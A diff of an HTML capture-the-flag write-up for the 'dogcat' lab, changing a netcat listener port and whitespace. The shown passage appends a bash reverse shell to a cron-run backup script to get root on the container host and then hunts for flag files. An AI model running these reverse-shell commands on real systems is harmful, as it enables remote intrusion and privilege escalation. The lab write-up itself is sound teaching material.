@@ -4399,12 +4399,12 @@ It seems as if the backup is created using the shell script in the same folder.<
 <p>This looks promising: We are root in a container that hosts the dogcat website and there is a script triggered from outside of the container running the "backup.sh" script (that we are able to edit) every minute.</p>
 <p>Let's try to exploit the backup.sh with a bash reverse shell:</p>
 <p>First, start a new netcat session on your system:</p>
-<div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">9999</span>
+<div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">7777</span>
 </code></pre></div>
 <p>Then append the bash reverse shell to the backup script:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;bash -i &gt;&amp; /dev/tcp/10.9.182.239/7777 0&gt;&amp;1&quot;</span> &gt;&gt; backup.sh
 </code></pre></div>
-<p>After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system. </p>
+<p>After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system.</p>
 <p>Running <code>whoami</code> we can see that we are root - whoop whoop!</p>
 <p>Let's search for flag 4:</p>
 <div class="highlight"><pre><span></span><code>find / -type f -iname <span class="s2">&quot;*flag*&quot;</span>
